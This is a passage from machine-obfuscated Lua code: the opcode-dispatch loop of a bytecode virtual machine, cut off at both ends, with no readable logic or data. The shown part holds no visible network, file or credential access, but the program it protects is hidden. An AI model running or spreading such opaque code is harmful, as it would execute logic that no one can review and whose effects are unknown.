elseif(198<z)then local ba,bb=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if 2>ba then w[y[898]]=w[y[716]][y[585]];else n=n+1;end end else if ba<=4 then if 4~=ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end else if 5<ba then y=f[n];else n=n+1;end end end else if ba<=10 then if ba<=8 then if ba<8 then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if 10~=ba then y=f[n];else w[y[898]]=w[y[716]]*y[585];end end else if ba<=12 then if 12>ba then n=n+1;else y=f[n];end else if ba==13 then w[y[898]]=w[y[716]]+w[y[585]];else n=n+1;end end end end else if ba<=22 then if ba<=18 then if ba<=16 then if ba<16 then y=f[n];else w[y[898]]=j[y[716]];end else if ba~=18 then n=n+1;else y=f[n];end end else if ba<=20 then if ba<20 then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if ba==21 then y=f[n];else w[y[898]]=w[y[716]];end end end else if ba<=26 then if ba<=24 then if 24~=ba then n=n+1;else y=f[n];end else if 25<ba then n=n+1;else w[y[898]]=w[y[716]]+w[y[585]];end end else if ba<=28 then if ba<28 then y=f[n];else bb=y[898]end else if ba~=30 then w[bb]=w[bb](r(w,bb+1,y[716]))else break end end end end end ba=ba+1 end else local ba=y[898]local bb,bc=i(w[ba](r(w,(ba+1),y[716])))p=bc+ba-1 local bc=0;for bd=ba,p do bc=(bc+1);w[bd]=bb[bc];end;end;elseif(z<200 or z==200)then local ba=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0==ba then w[y[898]][y[716]]=y[585];else n=n+1;end else if ba<=2 then y=f[n];else if ba~=4 then w[y[898]]={};else n=n+1;end end end else if ba<=6 then if ba<6 then y=f[n];else w[y[898]][y[716]]=w[y[585]];end else if ba<=7 then n=n+1;else if 9>ba then y=f[n];else w[y[898]]=h[y[716]];end end end end else if ba<=14 then if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if ba<=12 then w[y[898]]=w[y[716]][y[585]];else if ba==13 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba>15 then n=n+1;else w[y[898]][y[716]]=w[y[585]];end else if ba<=17 then y=f[n];else if 19>ba then w[y[898]][y[716]]=w[y[585]];else break end end end end end ba=ba+1 end elseif(202~=z)then local ba=y[898]local bb={w[ba](r(w,ba+1,p))};local bc=0;for bd=ba,y[585]do bc=(bc+1);w[bd]=bb[bc];end else local ba=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 0==ba then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if ba~=3 then y=f[n];else w[y[898]][y[716]]=w[y[585]];end end else if ba<=5 then if ba<5 then n=n+1;else y=f[n];end else if 7>ba then w[y[898]]=h[y[716]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if 8<ba then w[y[898]]=w[y[716]][y[585]];else y=f[n];end else if ba==10 then n=n+1;else y=f[n];end end else if ba<=13 then if 13~=ba then w[y[898]][y[716]]=w[y[585]];else n=n+1;end else if ba<=14 then y=f[n];else if ba<16 then do return w[y[898]]end else break end end end end end ba=ba+1 end end;elseif z<=205 then if z<=203 then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0<ba then bc=nil else bb=nil end else if ba<=2 then bd=nil else if 4>ba then w[y[898]]=h[y[716]];else n=n+1;end end end else if ba<=6 then if ba~=6 then y=f[n];else w[y[898]]=h[y[716]];end else if ba<=7 then n=n+1;else if 8<ba then w[y[898]]=w[y[716]][y[585]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[898]]=w[y[716]][w[y[585]]];else if 14~=ba then n=n+1;else y=f[n];end end end else if ba<=16 then if 16>ba then bd=y[898]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba<19 then for be=bd,y[585]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif 205>z then local ba=w[y[585]];if ba then n=n+1;else w[y[898]]=ba;n=y[716];end;else if not w[y[898]]then n=n+1;else n=y[716];end;end;elseif 206>=z then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1~=ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 3==ba then w[y[898]]=h[y[716]];else n=n+1;end end end else if ba<=6 then if 5==ba then y=f[n];else w[y[898]]=h[y[716]];end else if ba<=7 then n=n+1;else if 8<ba then w[y[898]]=w[y[716]][y[585]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if ba<11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[898]]=w[y[716]][w[y[585]]];else if ba<14 then n=n+1;else y=f[n];end end end else if ba<=16 then if 15<ba then bc={w[bd](w[bd+1])};else bd=y[898]end else if ba<=17 then bb=0;else if ba~=19 then for be=bd,y[585]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif 208>z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];if w[y[898]]then n=n+1;else n=y[716];end;else local ba;local bb;local bc;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=219 then if 213>=z then if 210>=z then if 210>z then local ba;local bb;w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]={r({},1,y[716])};n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];bb=y[898];ba=w[bb];for bc=bb+1,y[716]do t(ba,w[bc])end;else local ba=y[898]local bb={w[ba](w[ba+1])};local bc=0;for bd=ba,y[585]do bc=bc+1;w[bd]=bb[bc];end end;elseif 211>=z then local ba=y[898];do return w[ba](r(w,(ba+1),y[716]))end;elseif 213~=z then local ba;w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba]()else w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];if(w[y[898]]~=w[y[585]])then n=n+1;else n=y[716];end;end;elseif 216>=z then if z<=214 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))elseif z<216 then local ba;w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))else local ba;w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))end;elseif z<=217 then n=y[716];elseif 218<z then w[y[898]]=w[y[716]]+y[585];else if(y[898]<w[y[585]])then n=n+1;else n=y[716];end;end;elseif z<=225 then if z<=222 then if(220>=z)then local ba=(w[y[898]]+y[585]);w[y[898]]=ba;if(ba==w[y[898]+1]or ba<w[y[898]+1])then n=y[716];end;elseif(z>221)then local ba,bb=0 while true do if ba<=16 then if ba<=7 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else w[y[898]]=w[y[716]][y[585]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if 5>ba then w[y[898]]=h[y[716]];else n=n+1;end else if 6==ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end else if ba<=11 then if ba<=9 then if ba>8 then y=f[n];else n=n+1;end else if 11~=ba then w[y[898]]={};else n=n+1;end end else if ba<=13 then if 12<ba then w[y[898]]=h[y[716]];else y=f[n];end else if ba<=14 then n=n+1;else if 15==ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end end end else if ba<=24 then if ba<=20 then if ba<=18 then if 17<ba then y=f[n];else n=n+1;end else if 20>ba then w[y[898]]=h[y[716]];else n=n+1;end end else if ba<=22 then if ba>21 then w[y[898]]={};else y=f[n];end else if ba==23 then n=n+1;else y=f[n];end end end else if ba<=28 then if ba<=26 then if ba<26 then w[y[898]]=h[y[716]];else n=n+1;end else if 28>ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end else if ba<=30 then if 29==ba then n=n+1;else y=f[n];end else if ba<=31 then bb=y[898]else if ba~=33 then w[bb]=w[bb]()else break end end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=79 then if ba<=39 then if ba<=19 then if ba<=9 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else w[y[898]]=h[y[716]];end else if ba<=2 then n=n+1;else if 3<ba then w[y[898]]=w[y[716]][y[585]];else y=f[n];end end end else if ba<=6 then if ba<6 then n=n+1;else y=f[n];end else if ba<=7 then w[y[898]]=h[y[716]];else if 8<ba then y=f[n];else n=n+1;end end end end else if ba<=14 then if ba<=11 then if ba==10 then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if ba<=12 then y=f[n];else if 13==ba then w[y[898]][w[y[716]]]=w[y[585]];else n=n+1;end end end else if ba<=16 then if 16>ba then y=f[n];else w[y[898]]=h[y[716]];end else if ba<=17 then n=n+1;else if 19~=ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end end end else if ba<=29 then if ba<=24 then if ba<=21 then if 20==ba then n=n+1;else y=f[n];end else if ba<=22 then w[y[898]]=h[y[716]];else if 23==ba then n=n+1;else y=f[n];end end end else if ba<=26 then if ba<26 then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if ba<=27 then y=f[n];else if ba==28 then w[y[898]][w[y[716]]]=w[y[585]];else n=n+1;end end end end else if ba<=34 then if ba<=31 then if ba>30 then w[y[898]]=h[y[716]];else y=f[n];end else if ba<=32 then n=n+1;else if ba~=34 then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end else if ba<=36 then if ba>35 then y=f[n];else n=n+1;end else if ba<=37 then w[y[898]]=h[y[716]];else if 38<ba then y=f[n];else n=n+1;end end end end end end else if ba<=59 then if ba<=49 then if ba<=44 then if ba<=41 then if ba<41 then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if ba<=42 then y=f[n];else if 43==ba then w[y[898]][w[y[716]]]=w[y[585]];else n=n+1;end end end else if ba<=46 then if 46~=ba then y=f[n];else w[y[898]]=h[y[716]];end else if ba<=47 then n=n+1;else if 49~=ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end end else if ba<=54 then if ba<=51 then if ba~=51 then n=n+1;else y=f[n];end else if ba<=52 then w[y[898]]=h[y[716]];else if 53<ba then y=f[n];else n=n+1;end end end else if ba<=56 then if 55==ba then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if ba<=57 then y=f[n];else if 59>ba then w[y[898]][w[y[716]]]=w[y[585]];else n=n+1;end end end end end else if ba<=69 then if ba<=64 then if ba<=61 then if ba<61 then y=f[n];else w[y[898]]=h[y[716]];end else if ba<=62 then n=n+1;else if 64~=ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end else if ba<=66 then if 66~=ba then n=n+1;else y=f[n];end else if ba<=67 then w[y[898]]=h[y[716]];else if ba==68 then n=n+1;else y=f[n];end end end end else if ba<=74 then if ba<=71 then if 70==ba then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if ba<=72 then y=f[n];else if 74>ba then w[y[898]][w[y[716]]]=w[y[585]];else n=n+1;end end end else if ba<=76 then if ba>75 then w[y[898]]=h[y[716]];else y=f[n];end else if ba<=77 then n=n+1;else if ba==78 then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end end end end end else if ba<=119 then if ba<=99 then if ba<=89 then if ba<=84 then if ba<=81 then if ba==80 then n=n+1;else y=f[n];end else if ba<=82 then w[y[898]]=h[y[716]];else if 84~=ba then n=n+1;else y=f[n];end end end else if ba<=86 then if 85==ba then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if ba<=87 then y=f[n];else if 88==ba then w[y[898]][w[y[716]]]=w[y[585]];else n=n+1;end end end end else if ba<=94 then if ba<=91 then if 91~=ba then y=f[n];else w[y[898]]=h[y[716]];end else if ba<=92 then n=n+1;else if 94>ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end else if ba<=96 then if 95<ba then y=f[n];else n=n+1;end else if ba<=97 then w[y[898]]=h[y[716]];else if ba==98 then n=n+1;else y=f[n];end end end end end else if ba<=109 then if ba<=104 then if ba<=101 then if 100==ba then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if ba<=102 then y=f[n];else if 104>ba then w[y[898]][w[y[716]]]=w[y[585]];else n=n+1;end end end else if ba<=106 then if ba~=106 then y=f[n];else w[y[898]]=h[y[716]];end else if ba<=107 then n=n+1;else if ba==108 then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end end else if ba<=114 then if ba<=111 then if 110<ba then y=f[n];else n=n+1;end else if ba<=112 then w[y[898]]=h[y[716]];else if ba==113 then n=n+1;else y=f[n];end end end else if ba<=116 then if ba~=116 then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if ba<=117 then y=f[n];else if ba~=119 then w[y[898]][w[y[716]]]=w[y[585]];else n=n+1;end end end end end end else if ba<=139 then if ba<=129 then if ba<=124 then if ba<=121 then if ba>120 then w[y[898]]=h[y[716]];else y=f[n];end else if ba<=122 then n=n+1;else if ba==123 then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end else if ba<=126 then if 125==ba then n=n+1;else y=f[n];end else if ba<=127 then w[y[898]]=h[y[716]];else if ba>128 then y=f[n];else n=n+1;end end end end else if ba<=134 then if ba<=131 then if ba>130 then n=n+1;else w[y[898]]=w[y[716]][y[585]];end else if ba<=132 then y=f[n];else if 134~=ba then w[y[898]][w[y[716]]]=w[y[585]];else n=n+1;end end end else if ba<=136 then if 136>ba then y=f[n];else w[y[898]]=h[y[716]];end else if ba<=137 then n=n+1;else if 138==ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end end end else if ba<=149 then if ba<=144 then if ba<=141 then if ba<141 then n=n+1;else y=f[n];end else if ba<=142 then w[y[898]]=h[y[716]];else if ba~=144 then n=n+1;else y=f[n];end end end else if ba<=146 then if 146~=ba then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if ba<=147 then y=f[n];else if ba==148 then w[y[898]][w[y[716]]]=w[y[585]];else n=n+1;end end end end else if ba<=154 then if ba<=151 then if 151>ba then y=f[n];else w[y[898]]=j[y[716]];end else if ba<=152 then n=n+1;else if ba<154 then y=f[n];else w[y[898]]=w[y[716]];end end end else if ba<=156 then if 155==ba then n=n+1;else y=f[n];end else if ba<=157 then bb=y[898]else if 159>ba then w[bb]=w[bb](w[bb+1])else break end end end end end end end end ba=ba+1 end end;elseif z<=223 then w[y[898]]=h[y[716]];elseif z>224 then local ba;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](w[ba+1])else local ba=y[898];local bb=y[585];local bc=ba+2;local bd={w[ba](w[ba+1],w[bc])};for be=1,bb do w[bc+be]=bd[be];end local ba=w[ba+3];if ba then w[bc]=ba;n=y[716];else n=n+1 end;end;elseif z<=228 then if 226>=z then local ba=y[898];local bb=w[ba];for bc=ba+1,p do t(bb,w[bc])end;elseif z==227 then local ba=w[y[585]];if ba then n=n+1;else w[y[898]]=ba;n=y[716];end;else local ba=w[y[585]];if not ba then n=n+1;else w[y[898]]=ba;n=y[716];end;end;elseif 229>=z then if(y[898]<w[y[585]])then n=(n+1);else n=y[716];end;elseif z~=231 then local ba;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))else w[y[898]]=w[y[716]]/y[585];end;elseif 254>=z then if z<=242 then if 236>=z then if 233>=z then if z<233 then local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=false;n=n+1;y=f[n];ba=y[898]w[ba](w[ba+1])else local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=false;n=n+1;y=f[n];ba=y[898]w[ba](w[ba+1])end;elseif 234>=z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];if w[y[898]]then n=n+1;else n=y[716];end;elseif z==235 then local ba=y[898]w[ba](r(w,ba+1,y[716]))else local ba=y[898]local bb={w[ba](r(w,ba+1,y[716]))};local bc=0;for bd=ba,y[585]do bc=bc+1;w[bd]=bb[bc];end;end;elseif z<=239 then if 237>=z then local ba;w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))elseif 238<z then local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end else local ba;local bb;w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]={r({},1,y[716])};n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];bb=y[898];ba=w[bb];for bc=bb+1,y[716]do t(ba,w[bc])end;end;elseif z<=240 then local ba;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))elseif z==241 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]]+y[585];n=n+1;y=f[n];h[y[716]]=w[y[898]];n=n+1;y=f[n];do return end;n=n+1;y=f[n];do return end;else local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]]*y[585];n=n+1;y=f[n];w[y[898]]=w[y[716]]+w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]]+w[y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))end;elseif 248>=z then if z<=245 then if 243>=z then local ba;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))elseif 245>z then if(w[y[898]]<=w[y[585]])then n=n+1;else n=y[716];end;else local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=246 then local ba;w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba]()elseif 247<z then w[y[898]]=true;else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];if w[y[898]]then n=n+1;else n=y[716];end;end;elseif z<=251 then if z<=249 then if(y[898]<=w[y[585]])then n=n+1;else n=y[716];end;elseif z>250 then w[y[898]][y[716]]=y[585];else local ba=d[y[716]];local bb={};local bc={};for bd=1,y[585]do n=n+1;local be=f[n];if be[226]==15 then bc[bd-1]={w,be[716]};else bc[bd-1]={h,be[716]};end;v[#v+1]=bc;end;m(bb,{['\95\95\105\110\100\101\120']=function(m,m)local m=bc[m];return m[1][m[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(m,m,v)local m=bc[m]m[1][m[2]]=v;end;});w[y[898]]=b(ba,bb,j);end;elseif 252>=z then w[y[898]]=b(d[y[716]],nil,j);elseif 253<z then local m;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];m=y[898]w[m]=w[m](r(w,m+1,y[716]))else if(w[y[898]]~=y[585])then n=y[716];else n=n+1;end;end;elseif z<=266 then if 260>=z then if 257>=z then if z<=255 then local m;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];m=y[898]w[m]=w[m]()elseif z==256 then local m=y[898];do return r(w,m,p)end;else w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];if(w[y[898]]~=y[585])then n=n+1;else n=y[716];end;end;elseif z<=258 then local m;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];m=y[898]w[m]=w[m](r(w,m+1,y[716]))elseif z==259 then local m;local v;local ba;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];ba=y[898]v={w[ba](w[ba+1])};m=0;for bb=ba,y[585]do m=m+1;w[bb]=v[m];end else w[y[898]]=j[y[716]];end;elseif 263>=z then if 261>=z then local m;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];m=y[898]w[m]=w[m](r(w,m+1,y[716]))elseif 263>z then w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];if w[y[898]]then n=n+1;else n=y[716];end;else local m;local v;local ba;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];ba=y[898]v={w[ba](w[ba+1])};m=0;for bb=ba,y[585]do m=m+1;w[bb]=v[m];end end;elseif 264>=z then local m,v,ba,bb=0 while true do if m<=9 then if m<=4 then if m<=1 then if m>0 then ba=nil else v=nil end else if m<=2 then bb=nil else if 4>m then w[y[898]]=h[y[716]];else n=n+1;end end end else if m<=6 then if m<6 then y=f[n];else w[y[898]]=h[y[716]];end else if m<=7 then n=n+1;else if 9~=m then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end end else if m<=14 then if m<=11 then if 11~=m then n=n+1;else y=f[n];end else if m<=12 then w[y[898]]=w[y[716]][w[y[585]]];else if m<14 then n=n+1;else y=f[n];end end end else if m<=16 then if 15==m then bb=y[898]else ba={w[bb](w[bb+1])};end else if m<=17 then v=0;else if 18==m then for bc=bb,y[585]do v=v+1;w[bc]=ba[v];end else break end end end end end m=m+1 end elseif z>265 then w={};for m=0,u,1 do if m<o then w[m]=s[m+1];else 